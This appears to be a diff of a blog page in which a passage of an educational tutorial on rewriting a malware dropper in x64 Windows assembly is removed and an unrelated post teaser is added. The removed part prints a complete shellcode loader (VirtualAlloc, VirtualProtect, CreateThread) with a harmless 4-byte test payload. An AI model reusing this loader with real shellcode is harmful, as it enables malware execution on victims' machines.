-<span class="w">    </span><span class="no">msg_format</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="na">...</span>
-</code></pre></div>
-
-<p>This is optional in C as you can pass data (like a string) directly to a function without adding it to a variable:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
-<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
-</code></pre></div>
-
-<p>However, under the hood, the C compiler actually places these data on the <code>.data</code> segment for you automatically. If you were to compile and run the C program you would see that the strings are in the <code>.data</code> segment.</p>
-<h2 id="uninitialized-data">Uninitialized data</h2>
-<p>Memory of certain sizes can be reserved so that it can be used later in a program. These unitialized data is declared not in a <code>.data</code> segment but in a <code>.bss</code> segment <a href="https://en.wikipedia.org/wiki/.bss">(more here)</a>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-</code></pre></div>
-
-<p>Nasm provides specific "pseudo-instructions" for declaring unitialized data like <code>resb</code> (reserve byte), <code>resw</code> (reserve word), and so on. </p>
-<p>Alternatively, this can be written like this:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">        </span><span class="no">db</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="no">dup</span><span class="w"> </span><span class="p">(</span><span class="err">?</span><span class="p">)</span><span class="w">   </span><span class="c1">; Reserve 8 bytes of ? null value</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w">     </span><span class="no">dq</span><span class="w">  </span><span class="mi">1</span><span class="w">           </span><span class="c1">; DQ = QWORD</span>
-</code></pre></div>
-
-<p>It would still work but NASM doesn't like it and would throw a warning.</p>
-<div class="codehilite"><pre><span></span><code>dropper_data.asm:18:<span class="w"> </span>warning:<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>initialize<span class="w"> </span>memory<span class="w"> </span><span class="k">in</span><span class="w"> </span>BSS<span class="w"> </span>section<span class="w"> </span><span class="sb">`</span>.bss<span class="err">&#39;</span>:<span class="w"> </span>ignored<span class="w"> </span><span class="o">[</span>-w+other<span class="o">]</span>
-</code></pre></div>
-
-<p>The memory for the uninitialized data won't be reserved until the program is loaded. Once it is, we can see the reserved memory in the <code>.data</code> segment. </p>
-<p>Any data we move to the previously unitialized data can now be seen from a debugger. See below for an example:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span><span class="w">  </span><span class="c1">; Move &quot;000001F96E100000&quot; to memory</span>
-</code></pre></div>
-
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-04" src="../images/converting-a-malware-dropper-to-x64-assembly-04.png" /></p>
-<h2 id="shadow-spaces">Shadow Spaces</h2>
-<p>When calling a function in x64 Windows assembly, programmers must keep in mind to reserve a "shadow space" before doing a <code>call</code> to an external function that is in another language like C or C++. For example:</p>
-<div class="codehilite"><pre><span></span><code>    sub     rsp, 32 
-    call    getchar
-    add     rsp, 32
-</code></pre></div>
-
-<p>But what is a shadow space? <a href="https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly">Here</a> is a quick explanation:</p>
-<blockquote>
-<p>The shadow space is the mandatory 32 bytes (4x8 bytes) you must reserve for the called procedure. It just means you must provide 32 bytes on the stack before calling.</p>
-<p>It can be used by compilers to leave a copy of the register values on the stack for later inspection in the debugger. It is meant to be used to make debugging x64 easier.</p>
-</blockquote>
-<p>So in the code above, <code>sub rsp, 32</code> reserves the shadow space before <code>getchar</code> is called. The space on the stack is highlighted in the image below.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-05" src="../images/converting-a-malware-dropper-to-x64-assembly-05.png" /></p>
-<p><code>call getchar</code> then executes and the "shadow space" gets filled.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-06" src="../images/converting-a-malware-dropper-to-x64-assembly-06.png" /></p>
-<p>As the caller, we really do not care about the data that gets placed in the shadows space. So after calling the functions we do <code>add rsp, 32</code> to reclaim the shadow space.</p>
-<p>You'll find out the importance of properly reserving and releasing a shadow space especially if you are relying on the stack for saving local variables. Here is a segment of the code where I found out first-hand the importance of handling the shadow space.</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span><span class="w">                </span><span class="c1">;; I need rax for later so I pushed it on the stack</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf was expecting a shadow space so it just wrote onto the stack, overwriting the value from RAX before</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; getchar did the same too</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; The value saved by rax is overwritten</span>
-</code></pre></div>
-
-<p>Simply handling the shadow space avoided this problem:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
-</code></pre></div>
-
-<p>The above code can be further optimized by only releasing the shadow space after both call to <code>printf</code> and <code>getchar</code>, as shown below:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
-</code></pre></div>
-
-<p>However, there might come a time when the code will change and you might forget to re-add the code that releases and reserves the shadow space. This may lead to hard-to-find stack related problems. To avoid this, just make it a habit to reserve and release the shadow space every time an external function is called.</p>
-<p>As an alternative, you can use a routine that could reserve and release the shadow space automatically like the one below:</p>
-<div class="codehilite"><pre><span></span><code><span class="nl">shadow_call:</span>
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Get the return address pointer in a non-volitile register</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Add the shadow space</span>
-<span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="no">rax</span><span class="w">        </span><span class="c1">; Call the function</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Remove the shadow space</span>
-<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Go back to the stored instruction address</span>
-<span class="w">    </span><span class="nf">ret</span>
-</code></pre></div>
-
-<p>To call the routine, just do this:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">shadow_call</span>
-</code></pre></div>
-
-<p>But honestly, I think it's less complicated to just do the handling of shadow space yourself.</p>
-<p>Shadow spaces threw me off a bit when I was researching about this, but everything I said above should be enough of an explanation. If however you want more then go <a href="https://retroscience.net/x64-assembly.html">here</a> and then <a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735">here</a>.</p>
-<h2 id="microsoft-x64-calling-convention">Microsoft x64 Calling Convention</h2>
-<p>It is also important to note that the calling convention for functions is different for Windows compared to other operating systems.</p>
-<p>As a quick reference, if you are going to pass parameters to a function you need to use registers <code>rcx</code>, <code>rdx</code>, <code>r8</code>, and <code>r9</code> for the first, second, third, and fourth parameters respectively.</p>
-<p>Here's an example from our code:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">// Make new buffer as executable</span>
-<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
-</code></pre></div>
-
-<p>In assembly, we supply the parameters like so:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span><span class="w">      </span><span class="c1">;; First parameter</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Second parameter</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span><span class="w">             </span><span class="c1">;; Third parameter</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Fourth parameter</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Reserve shadow space</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">VirtualProtect</span><span class="w">   </span><span class="c1">;; Call function</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Release shadow space</span>
-</code></pre></div>
-
-<p>For functions that require more than four parameters, the stack needs to be utilized. This can get confusing so let me point you to <a href="https://sonictk.github.io/asm_tutorial/#windows:thewindowtothehardware/themicrosoftx64callingconvention">this post</a> as it has diagrams for visualization.</p>
-<h2 id="the-final-code">The final code</h2>
-<p>The rest of the code can be converted using the concepts I've described above. Here is the fully converted code:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
-<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_hello</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
-<span class="w">    </span><span class="no">msg_format</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="w">    </span><span class="c1">;; 4 byte payload</span>
-<span class="w">    </span><span class="nf">payload</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
-<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span><span class="w">   </span>
-
-<span class="no">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>
-
-<span class="nl">main:</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
-
-<span class="w">    </span><span class="c1">;; Allocate a memory buffer for payload.</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x3000</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="mi">0x4</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">payload</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_exec_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="c1">;; Copy payload to new buffer</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">r8</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8b</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">         </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">             </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="c1">;; If all good, run the payload </span>
-<span class="w">    </span><span class="nf">jz</span><span class="w">  </span><span class="no">ifrvzero</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">CreateThread</span>
-
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0xFFFFFFFF</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">WaitForSingleObject</span>
-
-<span class="nl">ifrvzero:</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
-</code></pre></div>
-
-<p>As mentioned before, I did my best to match the structure of the C code to the assembly code to make it easy to compare how one section was translated to the other. There are other parts like the <code>jz ifrvzero</code> conditonal jump that I didn't discuss, but those can be easily be understood if you know the basics in assembly.</p>
-<p>I've also uploaded the code on it's own repository <a href="https://github.com/accidentalrebel/malware-dropper-x64-win-assembly">here</a>. Updates and fixes to the code will be pushed there.</p>
-<hr />
-<p>A lot of the concepts I've described in this post were the lessons I learned while working on this project. Most of these can be researched but I'm hoping that collecting them in one location would benefit the next bloke who is crazy like me to do the same.</p>
-<p>Feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a> for any questions or comments.</p>
+            <p>After the recent changes to the <a href="../following-lispy-conventions.html">lisp side of my engine</a>, I took some time to review the C/C++ side. You'll notice that I have written C/C++ and that's because my codebase uses both of them. </p>
+<p>When I started my project, I initially intended for it to use just pure C, as this is the one I'm more familiar with. But over time some C++ features crept in. Features like namespacess, bools, and function overloading proved to be useful so I kept using them. Now my code uses C concepts with new nifty C++ features.</p>
+<p>Now, I could have just continued with this approach. It works, after all. But I wondered if I should just stick to C and drop C++ altogether. My thinking is that sticking with just one language would make the code simpler as I only have to use it's subset of features. I know …</p>
+            <a href="../switching-from-c-c---to-c.html" class="read-more">Read more &rarr;</a>
         </div>
 
         <div class="tags">
-            <a href="../tag/malware.html" class="tag">malware</a>
